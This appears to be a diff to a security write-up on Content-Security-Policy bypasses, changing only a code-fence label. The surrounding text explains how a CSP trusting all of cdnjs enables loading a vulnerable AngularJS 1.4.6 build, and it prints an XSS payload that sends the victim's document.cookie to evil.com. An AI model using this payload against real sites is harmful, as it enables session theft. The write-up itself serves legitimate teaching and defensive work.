@@ -326,7 +326,7 @@ Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' http
 
 However, an attacker can bypass the above CSP since it does not specify exact JavaScript files from `https://cdnjs.cloudflare.com/` and vulnerable code to XSS that is hosted on `https://cdnjs.cloudflare.com/` can be loaded. The below payload bypasses the CSP by loading the XSS vulnerable AngularJS version 1.4.6 JavaScript file then executing the payload using a `<div>` tag.
 
-```
+```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
 <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };window.location = "https://evil.com/?nomnom="+document.cookie;//');}} </div>
 ```
